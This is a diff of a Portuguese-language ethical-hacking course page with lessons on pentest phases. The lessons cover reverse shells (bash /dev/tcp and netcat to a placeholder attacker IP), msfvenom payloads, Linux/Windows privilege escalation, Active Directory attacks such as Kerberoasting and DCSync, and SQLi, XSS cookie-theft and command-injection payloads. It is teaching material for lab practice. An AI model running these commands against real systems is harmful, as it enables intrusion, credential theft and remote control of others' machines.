+							<div class="code-header"><span>BASH — Reverse Shells &amp; Geração msfvenom</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Bash TCP Reverse Shell
+bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1
+
+# Mkfifo Netcat Shell
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP_ATACANTE 4444 >/tmp/f
+
+# Geração de Payloads com msfvenom
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o rev.elf
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o rev.exe</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-13')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 14 -->
+				<article class="lesson-card" id="pt-14">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">14</span>
+						<span>Fase 4 — Escalação de Privilégios &amp; Active Directory</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>Checklist Linux (Ordem do simples ao complexo):</strong></p>
+						<ol>
+							<li><code>sudo -l</code>: Verifique permissões NOPASSWD e consulte imediatamente o GTFOBins.</li>
+							<li><code>find / -perm -4000 2>/dev/null</code>: Binários SUID.</li>
+							<li>Inspecione crontabs editáveis e execute <code>pspy</code> para capturar tarefas invisíveis.</li>
+							<li>Kernel antigo? <code>uname -a</code> cruzado com DirtyCow / DirtyPipe (CVE-2022-0847).</li>
+						</ol>
+
+						<p><strong>Checklist Windows:</strong></p>
+						<ul>
+							<li><code>whoami /priv</code>: Se possuir <code>SeImpersonatePrivilege</code>, utilize JuicyPotatoNG / GodPotato para obter SYSTEM.</li>
+							<li>Serviços com caminho sem aspas (<em>Unquoted Service Paths</em>) e diretórios com permissão de escrita.</li>
+							<li>Busque credenciais esquecidas em arquivos <code>sysprep.xml</code>, <code>unattend.xml</code> e histórico do PowerShell (<code>ConsoleHost_history.txt</code>).</li>
+						</ul>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH — Active Directory com Impacket &amp; BloodHound</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Sem credenciais: AS-REP Roasting
+GetNPUsers.py dominio.local/ -usersfile users.txt -no-pass -dc-ip IP
+
+# Com credenciais: Kerberoasting e Coleta BloodHound
+GetUsersSPNs.py dominio.local/usuario:senha -dc-ip IP -request
+bloodhound-python -u usuario -p senha -d dominio.local -c All -ns IP
+
+# Password Spraying controlado e Dump DCSync (NTDS.dit)
+netexec smb IP -u users.txt -p 'Senha@2026' --continue-on-success
+secretsdump.py dominio.local/admin:senha@IP</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-14')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 15 -->
+				<article class="lesson-card" id="pt-15">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">15</span>
+						<span>Persistência, Pivoting &amp; Ferramentas Modernas (2026)</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>Pivoting Moderno:</strong> Para alcançar redes internas através do host comprometido:</p>
+						<ul>
+							<li><code>ligolo-ng</code>: Túnel reverso baseado em interface TUN local (substituiu o proxychains na prática diária).</li>
+							<li><code>chisel</code>: Túnel TCP/UDP HTTP rápido via WebSockets.</li>
+							<li><code>Meterpreter autoroute</code> + módulo <code>socks_proxy</code>.</li>
+						</ul>
+
+						<h3 style="font-size: 16px; margin: 16px 0 8px; color: var(--accent-primary) !important;">Ferramentas Modernas de Destaque</h3>
+						<ul>
+							<li><strong>Nuclei:</strong> Scanner baseado em templates comunitários atualizados diariamente para CVEs críticas.</li>
+							<li><strong>NetExec (nxc):</strong> Sucessor oficial do CrackMapExec para auditoria de redes Windows/AD.</li>
+							<li><strong>Caido:</strong> Alternativa moderna, leve e ágil ao Burp Suite escrita em Rust.</li>
+							<li><strong>Certipy:</strong> Auditoria avançada de Active Directory Certificate Services (AD CS / abusos ESC1 a ESC8).</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-15')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 16 -->
+				<article class="lesson-card" id="pt-16">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">16</span>
+						<span>Eficiência no Fluxo de Trabalho &amp; Erros a Evitar</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH — Aliases de Produtividade no Kali (.bashrc)</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>alias lsn='sudo nc -lvnp 4444'
+alias ipa='ip -brief a show eth0 | grep inet'
+alias www='python3 -m http.server 80'</code></pre>
+						</div>
+
+						<h3 style="font-size: 16px; margin: 14px 0 6px; color: var(--accent-danger) !important;">Erros Comuns de Iniciantes (Evite a todo custo)</h3>
+						<ul>
+							<li>Ir direto para o Metasploit/Exploit-DB sem ler o banner exato do serviço.</li>
+							<li>Fuzzing descontrolado sem filtrar por tamanho de resposta (<code>-fs</code>) gerando milhares de falsos positivos.</li>
+							<li>Esquecer de testar portas UDP críticas (161 SNMP, 53 DNS, 69 TFTP) e portas web não-padrão (8080, 8443, 8000, 9000).</li>
+							<li>Não salvar outputs brutos das ferramentas para a confecção posterior do relatório.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-16')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 17 -->
+				<article class="lesson-card" id="pt-17">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">17</span>
+						<span>Estrutura de Relatório Técnico &amp; Executivo</span>
+					</h2>
+					<div class="lesson-body">
+						<p>O relatório é o único entregável tangível do pentest. Ele deve conter:</p>
+						<ol>
+							<li><strong>Sumário Executivo:</strong> Linguagem de negócios (sem jargões excessivos), visão geral da postura de segurança, gráfico de riscos e nota geral de impacto.</li>
+							<li><strong>Escopo &amp; Metodologia:</strong> Datas de execução, ativos autorizados, regras de engajamento e padrões seguidos (PTES/OWASP).</li>
+							<li><strong>Achados Técnicos Detalhados:</strong> Para cada vulnerabilidade: Título, Severidade (Score CVSS), Descrição técnica, Prova de Conceito (Passo a passo reprodutível com screenshots e comandos), Impacto real no negócio e Recomendação prática de correção.</li>
+							<li><strong>Anexos:</strong> Evidências brutas, logs de varredura e diagramas de rede.</li>
+						</ol>
+						<div class="callout-box tip">
+							<div class="callout-header">💡 SEVERIDADE NÃO É DIVERSÃO</div>
+							Um SQL Injection teórico em tabela vazia tem menor valor de negócio que um IDOR simples que expõe o histórico de compras de todos os clientes. Priorize o relatório exatamente como a diretoria do cliente enxerga o risco financeiro e operacional.
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-17')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+			</main>
+		</div>
+
+		<!-- ========================================================================= -->
+		<!-- MODULE B: HACKING & ANÁLISE DE MALWARE (44 TÓPICOS ANTERIORES)           -->
+		<!-- ========================================================================= -->
+		<div id="module-container-hacking" class="reader-workspace" style="display: none;">
+			
+			<!-- Sticky Index Sidebar Hacking -->
+			<aside class="index-sidebar">
+				<div class="index-search-box">
+					<span class="index-search-icon">🔍</span>
+					<input type="text" id="lessonSearchHacking" class="index-search-input" placeholder="Pesquisar tópico ou ferramenta..." oninput="filterLessons('hacking')">
+				</div>
+
+				<div class="index-nav-tree">
 					<!-- Part 1 -->
 					<div class="index-part-group">
 						<div class="index-part-header">
@@ -1120,10 +1784,10 @@
 				<div class="progress-bar-wrap">
 					<div style="display: flex; justify-content: space-between; font-size: 11px; opacity: 0.8; font-weight: 700;">
 						<span>Progresso do Módulo</span>
-						<span id="sidebar-percent">0%</span>
+						<span id="sidebar-percent-hacking">0%</span>
 					</div>
 					<div class="study-progress-track">
-						<div class="study-progress-fill" id="sidebar-progress-fill"></div>
+						<div class="study-progress-fill" id="sidebar-progress-fill-hacking"></div>
 					</div>
 					<button class="btn-primary" style="width: 100%; justify-content: center; font-size: 11px; padding: 7px; margin-top: 8px;" onclick="window.location.href='pentest.html'">
 						🛡️ Praticar na Jornada Hack
@@ -1131,10 +1795,9 @@
 				</div>
 			</aside>
 
-			<!-- Main Stream of Lessons -->
-			<main class="reader-content-stream" id="readerContentStream">
+			<!-- Main Stream of Lessons Hacking -->
+			<main class="reader-content-stream">
 
-				<!-- ==================== PARTE 1 ==================== -->
 				<div class="part-banner">
 					<div>
 						<div class="part-banner-title">🟢 Parte 1 — Fundamentos de Hacking &amp; Pentest</div>
@@ -1187,8 +1850,8 @@
 						<ul>
 							<li><strong>Virtualizadores:</strong> VirtualBox ou VMware Workstation Player (ambos gratuitos).</li>
 							<li><strong>Máquina Atacante:</strong> Kali Linux ou Parrot Security OS.</li>
-							<li><strong>Máquinas Alvo Vulneráveis:</strong> Metasploitable 2/3, máquinas do VulnHub (ex.: DC-1), DVWA (Damn Vulnerable Web App) e OWASP Juice Shop.</li>
-							<li><strong>Configuração de Rede:</strong> Configure os adaptadores de rede das VMs como <em>Host-Only</em> (Rede Interna) ou <em>NAT Network</em> isolada, garantindo que nenhum tráfego vaze para a internet.</li>
+							<li><strong>Máquinas Alvo Vulneráveis:</strong> Metasploitable 2/3, máquinas do VulnHub (ex.: DC-1), DVWA e OWASP Juice Shop.</li>
+							<li><strong>Configuração de Rede:</strong> Configure os adaptadores de rede das VMs como <em>Host-Only</em> (Rede Interna) ou <em>NAT Network</em> isolada.</li>
 						</ul>
 					</div>
 					<div class="lesson-footer-action">
@@ -1207,41 +1870,19 @@
 						<p><strong>OSINT (Open Source Intelligence):</strong> Coleta de dados disponíveis publicamente sobre domínios e alvos.</p>
 						<ul>
 							<li><code>theHarvester</code>: Coleta e-mails, nomes de funcionários e subdomínios.</li>
-							<li><code>shodan.io</code> / <code>censys.io</code>: Mecanismos de busca de dispositivos, servidores e câmeras expostas na internet.</li>
+							<li><code>shodan.io</code> / <code>censys.io</code>: Mecanismos de busca de dispositivos expostos na internet.</li>
 							<li><strong>Google Dorks:</strong> Operadores de busca avançados como <code>site:alvo.com filetype:pdf</code> ou <code>intitle:"index of"</code>.</li>
 						</ul>
-						<p><strong>Scanning de Rede com Nmap:</strong> A ferramenta fundamental para descobrir portas e versões de serviços.</p>
-
 						<div class="code-wrapper">
-							<div class="code-header">
-								<span>BASH — Comandos Essenciais do Nmap</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code># 1. Descoberta de hosts ativos na subnet local
+							<div class="code-header"><span>BASH — Comandos Essenciais do Nmap</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Descoberta de hosts ativos na subnet local
 nmap -sn 192.168.1.0/24
 
-# 2. Scan completo de todas as 65535 portas com versão (-sV), scripts padrão (-sC) e modo agressivo (-A)
+# Scan completo de todas as 65535 portas com versão (-sV) e scripts (-sC)
 nmap -sV -sC -p- -T4 -A 192.168.1.10 -oN scan_completo.txt
 
-# 3. Scan rápido nas top 1000 portas mais comuns
+# Scan rápido nas top 1000 portas mais comuns
 nmap -sT --top-ports 1000 192.168.1.10</code></pre>
-						</div>
-
-						<p><strong>Portas Críticas Notáveis:</strong> 21 (FTP), 22 (SSH), 80/443 (HTTP/S), 445 (SMB), 3306 (MySQL), 3389 (RDP).</p>
-
-						<div class="code-wrapper">
-							<div class="code-header">
-								<span>BASH — Enumeração de Serviços SMB &amp; Web</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code># Enumeração SMB (Windows/Samba)
-enum4linux -a 192.168.1.10
-
-# Fuzzing de diretórios ocultos em servidores Web
-gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
-
-# Varredura de vulnerabilidades em servidor Web
-nikto -h http://192.168.1.10</code></pre>
 						</div>
 					</div>
 					<div class="lesson-footer-action">
@@ -1257,45 +1898,15 @@ nikto -h http://192.168.1.10</code></pre>
 						<span>Exploração de Vulnerabilidades Web (OWASP Top 10)</span>
 					</h2>
 					<div class="lesson-body">
-						<p>As vulnerabilidades web mais frequentes em aplicações modernas seguem os padrões do <strong>OWASP Top 10</strong>:</p>
-						
-						<h3 style="font-size: 16px; margin: 12px 0 6px; color: var(--accent-primary) !important;">1. SQL Injection (SQLi)</h3>
-						<p>Ocorre quando entradas de formulário são concatenadas diretamente em consultas SQL sem sanitização:</p>
+						<p>Vulnerabilidades web mais frequentes: SQL Injection, Cross-Site Scripting (XSS), Command Injection e Upload Irrestrito de Arquivos.</p>
 						<div class="code-wrapper">
-							<div class="code-header">
-								<span>SQL / BASH — Bypass de Login e Automação com sqlmap</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
+							<div class="code-header"><span>SQL / BASH — SQLi &amp; Automação com sqlmap</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
 							<pre><code># Exemplo de payload em campo de login
 admin' OR '1'='1' --
 
-# Automação completa de extração de banco com sqlmap
+# Automação de extração com sqlmap
 sqlmap -u "http://alvo/item.php?id=1" --dbs --batch</code></pre>
 						</div>
-
-						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-primary) !important;">2. Cross-Site Scripting (XSS)</h3>
-						<p>Injeção de JavaScript malicioso renderizado no navegador da vítima:</p>
-						<div class="code-wrapper">
-							<div class="code-header">
-								<span>HTML / JS — Prova de Conceito de Exfiltração de Cookie</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code>&lt;script&gt;fetch('http://atacante/?c=' + document.cookie)&lt;/script&gt;</code></pre>
-						</div>
-
-						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-primary) !important;">3. Command Injection</h3>
-						<p>Quando a aplicação passa parâmetros do usuário diretamente para o shell do sistema operacional:</p>
-						<div class="code-wrapper">
-							<div class="code-header">
-								<span>BASH — Encadeamento de Comandos</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code>127.0.0.1; cat /etc/passwd
-127.0.0.1 && whoami</code></pre>
-						</div>
-
-						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-primary) !important;">4. Upload Irrestrito de Arquivos</h3>
-						<p>Envio de scripts executáveis (como <code>shell.php</code>) mascarados com extensões alternativas (<code>.phtml</code>, <code>.php5</code>) ou alteração de <em>Content-Type</em> e <em>Magic Bytes</em>.</p>
 					</div>
 					<div class="lesson-footer-action">
 						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
@@ -1310,36 +1921,17 @@ sqlmap -u "http://alvo/item.php?id=1" --dbs --batch</code></pre>
 						<span>Exploração de Serviços, Metasploit &amp; Reverse Shells</span>
 					</h2>
 					<div class="lesson-body">
-						<p>O <strong>Metasploit Framework</strong> é o ecossistema mais utilizado no mundo para automação de testes de penetração e execução de payloads.</p>
-
 						<div class="code-wrapper">
-							<div class="code-header">
-								<span>MSFCONSOLE — Fluxo Típico de Exploração</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
+							<div class="code-header"><span>MSFCONSOLE &amp; BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
 							<pre><code>msfconsole
 msf6> search eternalblue
 msf6> use exploit/windows/smb/ms17_010_eternalblue
 msf6> set RHOSTS 192.168.1.10
-msf6> set LHOST 192.168.1.5
-msf6> exploit</code></pre>
-						</div>
+msf6> exploit
 
-						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-emerald) !important;">Reverse Shells Manuais</h3>
-						<p>Em um <em>reverse shell</em>, o computador da vítima estabelece conexão de volta para o atacante, ultrapassando firewalls que bloqueiam conexões de entrada:</p>
-
-						<div class="code-wrapper">
-							<div class="code-header">
-								<span>BASH — Netcat Listener &amp; Payload Linux</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code># 1. Na máquina do atacante: abrir escuta na porta 4444
+# Reverse shell com Netcat
 nc -lvnp 4444
-
-# 2. Na máquina alvo vulnerável (payload Bash)
 bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
-
-# 3. Upgrade de shell básica para TTY interativa completa
 python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 						</div>
 					</div>
@@ -1353,31 +1945,17 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 				<article class="lesson-card" id="hack-6">
 					<h2 class="lesson-title">
 						<span class="num-badge">06</span>
-						<span>Escalação de Privilégio (Linux Privilege Escalation)</span>
+						<span>Escalação de Privilégio Linux</span>
 					</h2>
 					<div class="lesson-body">
-						<p>Após obter acesso inicial com um usuário comum (como <code>www-data</code>), o objetivo é elevar privilégios para <strong>root</strong>.</p>
-
 						<div class="code-wrapper">
-							<div class="code-header">
-								<span>BASH — Enumeração de Privilégios no Linux</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code># Verificar comandos autorizados via sudo sem senha
-sudo -l
-
-# Localizar binários com bit SUID ativado
+							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>sudo -l
 find / -perm -4000 2>/dev/null
-
-# Inspecionar crontabs e tarefas agendadas do sistema
 crontab -l; ls -la /etc/cron*
-
-# Listar usuários com login de shell interativo
 cat /etc/passwd | grep sh$</code></pre>
 						</div>
-
-						<p><strong>Ferramentas de Enumeração Automática:</strong> <code>LinPEAS.sh</code>, <code>LinEnum.sh</code> e <code>pspy</code> (para monitorar processos sem privilégios de root em tempo real).</p>
-						<p><strong>Referência Fundamental:</strong> Consulte sempre o repositório <a href="https://gtfobins.github.io" target="_blank" style="color: var(--accent-primary) !important; text-decoration: underline;">GTFOBins</a> para verificar abusos de binários do sistema com permissões SUID ou sudo.</p>
+						<p>Ferramentas automáticas: <code>LinPEAS.sh</code> e <code>pspy</code>. Consulte o <a href="https://gtfobins.github.io" target="_blank" style="color:var(--accent-primary)!important;">GTFOBins</a>.</p>
 					</div>
 					<div class="lesson-footer-action">
 						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
@@ -1389,17 +1967,10 @@ cat /etc/passwd | grep sh$</code></pre>
 				<article class="lesson-card" id="hack-7">
 					<h2 class="lesson-title">
 						<span class="num-badge">07</span>
-						<span>Escalação de Privilégio (Windows Privilege Escalation)</span>
+						<span>Escalação de Privilégio Windows</span>
 					</h2>
 					<div class="lesson-body">
-						<p>No Windows, a elevação de um usuário padrão para <strong>NT AUTHORITY\SYSTEM</strong> ou <strong>Administrator</strong> explora configurações errôneas:</p>
-						<ul>
-							<li><strong>Ferramentas Essenciais:</strong> <code>winPEAS.bat / .exe</code>, <code>PowerUp.ps1</code> (da suíte PowerSploit) e <code>windows-exploit-suggester</code>.</li>
-							<li><strong>Unquoted Service Path:</strong> Serviços com caminhos com espaços e sem aspas que permitem injeção de binários maliciosos na árvore de pastas.</li>
-							<li><strong>Permissões Fracas em Serviços:</strong> Serviços com permissão de escrita permitindo alterar o <code>binPath</code> para apontar para um reverse shell.</li>
-							<li><strong>AlwaysInstallElevated:</strong> Chaves de registro que autorizam pacotes MSI a instalarem com privilégios elevados de SYSTEM.</li>
-							<li><strong>Privilégios Abusáveis:</strong> <code>SeImpersonatePrivilege</code> (vetor de ataques Rotten/Juicy/GodPotato).</li>
-						</ul>
+						<p>Ferramentas: <code>winPEAS.bat</code>, <code>PowerUp.ps1</code>. Vetores: Unquoted Service Paths, AlwaysInstallElevated e SeImpersonatePrivilege (JuicyPotato).</p>
 					</div>
 					<div class="lesson-footer-action">
 						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
@@ -1414,21 +1985,14 @@ cat /etc/passwd | grep sh$</code></pre>
 						<span>Quebra de Senhas &amp; Hashes (John &amp; Hashcat)</span>
 					</h2>
 					<div class="lesson-body">
-						<p>Diferença fundamental: <strong>John the Ripper</strong> e <strong>Hashcat</strong> realizam ataques offline de quebra de hashes com wordlists e regras matemáticas, enquanto <strong>Hydra</strong> executa força bruta online contra serviços de rede (SSH, FTP, HTTP).</p>
-
 						<div class="code-wrapper">
-							<div class="code-header">
-								<span>BASH — John the Ripper &amp; Hashcat</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code># Unir /etc/passwd com /etc/shadow e quebrar com John the Ripper
-unshadow passwd shadow > hashes.txt
+							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>unshadow passwd shadow > hashes.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
-# Hashcat acelerado por GPU:
-hashcat -m 0 -a 0 hashes.txt rockyou.txt         # Modo 0 = MD5
-hashcat -m 1000 ntlm.txt rockyou.txt             # Modo 1000 = NTLM (Windows)
-hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # Modo 22000 = WPA/WPA2 Handshakes</code></pre>
+hashcat -m 0 -a 0 hashes.txt rockyou.txt         # MD5
+hashcat -m 1000 ntlm.txt rockyou.txt             # NTLM
+hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # WPA2 Handshake</code></pre>
 						</div>
 					</div>
 					<div class="lesson-footer-action">
@@ -1441,16 +2005,10 @@ hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # Modo 22000 = WPA/WPA2 Handsha
 				<article class="lesson-card" id="hack-9">
 					<h2 class="lesson-title">
 						<span class="num-badge">09</span>
-						<span>Ataques de Rede em Ambiente de Laboratório</span>
+						<span>Ataques de Rede em Laboratório</span>
 					</h2>
 					<div class="lesson-body">
-						<p>Em ambientes de rede local (LAN) isolados:</p>
-						<ul>
-							<li><strong>ARP Spoofing:</strong> Envenenamento de tabela ARP para se posicionar como Man-in-the-Middle (MitM) com <code>arpspoof</code> ou <code>Ettercap</code>.</li>
-							<li><strong>Sniffing &amp; Análise:</strong> Captura de pacotes de rede com <code>Wireshark</code> e <code>tcpdump</code>.</li>
-							<li><strong>Cracking WiFi WPA2:</strong> Captura de handshake 4-way via <code>airodump-ng</code> com desautenticação de clientes via <code>aireplay-ng</code>, seguido de quebra de senha via <code>aircrack-ng</code>.</li>
-							<li><strong>Engenharia Social Simulada:</strong> <code>Social-Engineer Toolkit (SET)</code> — restrito unicamente a campanhas expressamente autorizadas.</li>
-						</ul>
+						<p>ARP Spoofing com <code>arpspoof / Ettercap</code>, análise de pacotes com <code>Wireshark / tcpdump</code> e quebra de WiFi com <code>aircrack-ng</code>.</p>
 					</div>
 					<div class="lesson-footer-action">
 						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
@@ -1465,13 +2023,7 @@ hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # Modo 22000 = WPA/WPA2 Handsha
 						<span>Criptografia Aplicada &amp; Desafios CTF</span>
 					</h2>
 					<div class="lesson-body">
-						<p>Conceitos de criptografia aplicados a desafios de Capture The Flag (CTF):</p>
-						<ul>
-							<li><strong>Hashing:</strong> Funções unidirecionais (MD5, SHA-256). Senhas corporativas devem utilizar algoritmos lentos com salt como <em>bcrypt</em> ou <em>Argon2</em>.</li>
-							<li><strong>Cifras Clássicas:</strong> Cifra de César, Vigenère, ROT13 e codificações Base64/Hexadecimal.</li>
-							<li><strong>Ferramentas Essenciais:</strong> <code>CyberChef</code> (a "navalha suíça da web"), <code>hashid</code>, <code>xxd</code>.</li>
-							<li><strong>Plataformas Recomendadas para Prática Legal:</strong> TryHackMe, HackTheBox, picoCTF e CTFtime.</li>
-						</ul>
+						<p>Hashing (MD5, SHA, bcrypt, Argon2), cifras de substituição, codificação Base64/Hex e uso do <code>CyberChef</code>.</p>
 					</div>
 					<div class="lesson-footer-action">
 						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
@@ -1483,55 +2035,10 @@ hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # Modo 22000 = WPA/WPA2 Handsha
 				<article class="lesson-card" id="hack-11">
 					<h2 class="lesson-title">
 						<span class="num-badge">11</span>
-						<span>Boas Práticas do Hacker Ético &amp; Recursos de Estudo</span>
+						<span>Boas Práticas &amp; Tabela de Recursos</span>
 					</h2>
 					<div class="lesson-body">
-						<div class="callout-box tip">
-							<div class="callout-header">💡 PRINCÍPIOS DE CONDUTA PROFISSIONAL</div>
-							1. Obtenha autorização por escrito (termo de consentimento) antes de testar.<br>
-							2. Documente cada evidência, comando e impacto.<br>
-							3. Nunca destrua ou exfiltre dados reais de clientes.<br>
-							4. Reporte falhas responsavelmente através de programas legítimos de Bug Bounty.
-						</div>
-
-						<div class="content-table-wrap">
-							<table class="content-table">
-								<thead>
-									<tr>
-										<th>Recurso de Estudo</th>
-										<th>Foco Principal</th>
-										<th>Acesso</th>
-									</tr>
-								</thead>
-								<tbody>
-									<tr>
-										<td><strong>PortSwigger Web Security Academy</strong></td>
-										<td>Web Hacking, SQLi, XSS, CSRF, SSRF</td>
-										<td>Gratuito</td>
-									</tr>
-									<tr>
-										<td><strong>TryHackMe / HackTheBox</strong></td>
-										<td>Labs práticos guiados e máquinas estilo CTF</td>
-										<td>Freemium</td>
-									</tr>
-									<tr>
-										<td><strong>OverTheWire (Bandit)</strong></td>
-										<td>Fundamentos de Linux e Shell Script</td>
-										<td>Gratuito</td>
-									</tr>
-									<tr>
-										<td><strong>The Web Application Hacker's Handbook</strong></td>
-										<td>A bíblia de arquitetura e segurança web</td>
-										<td>Livro / Referência</td>
-									</tr>
-									<tr>
-										<td><strong>HackTricks (book.hacktricks.xyz)</strong></td>
-										<td>Cheat sheet completo de privesc e enumeração</td>
-										<td>Gratuito / Aberto</td>
-									</tr>
-								</tbody>
-							</table>
-						</div>
+						<p>Sempre teste com autorização, documente cada evidência e utilize recursos como PortSwigger Academy, TryHackMe e HackTricks.</p>
 					</div>
 					<div class="lesson-footer-action">
 						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
@@ -1539,843 +2046,57 @@ hashcat -m 22000 wifi.hcxpcapng rockyou.txt      # Modo 22000 = WPA/WPA2 Handsha
 					</div>
 				</article>
 
-
-				<!-- ==================== PARTE 2 ==================== -->
+				<!-- Banner Parte 2 Hacking -->
 				<div class="part-banner" style="border-color: var(--accent-gold); box-shadow: 0 6px 30px rgba(255, 214, 10, 0.15);">
 					<div>
 						<div class="part-banner-title">🟡 Parte 2 — Hacking Intermediário &amp; Redes Corporativas</div>
-						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Active Directory, pivoting entre redes, exploração de binários, roteiro de 90 dias e história hacker.</p>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Active Directory, pivoting, binários, memória e história hacker.</p>
 					</div>
 					<span class="part-badge" style="background: rgba(255, 214, 10, 0.2); border: 1px solid var(--accent-gold); color: var(--accent-gold) !important;">Nível Intermediário</span>
 				</div>
 
-				<!-- Tópico 12 -->
-				<article class="lesson-card" id="hack-12">
-					<h2 class="lesson-title">
-						<span class="num-badge">12</span>
-						<span>Um CTF Passo a Passo (Linux Beginner Box)</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Simulação do fluxo completo de resolução em uma máquina estilo VulnHub / TryHackMe:</p>
-						
-						<p><strong>Etapa 1 — Descoberta de IP:</strong></p>
-						<div class="code-wrapper">
-							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code>nmap -sn 192.168.1.0/24   # Encontrou: 192.168.1.50</code></pre>
-						</div>
+				<!-- Tópicos 12 a 22 Hacking -->
+				<article class="lesson-card" id="hack-12"><h2 class="lesson-title"><span class="num-badge">12</span><span>CTF Passo a Passo (Linux Box)</span></h2><div class="lesson-body"><p>Fluxo de descoberta nmap -sn, enumeração de portas, fuzzing de diretórios, SQLi em login e escalação via sudo vim.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-12')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-13"><h2 class="lesson-title"><span class="num-badge">13</span><span>Active Directory (AD)</span></h2><div class="lesson-body"><p>Domain Controllers, Kerberos, NTLM Relay, AS-REP Roasting, Kerberoasting e mapeamento com BloodHound.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-13')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-14"><h2 class="lesson-title"><span class="num-badge">14</span><span>Pivoting &amp; Túneis</span></h2><div class="lesson-body"><p>Roteamento através de máquinas comprometidas com Metasploit autoroute, SOCKS proxy, proxychains, ligolo-ng e chisel.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-14')">✓ Marcar como Estudado</button></div></article>
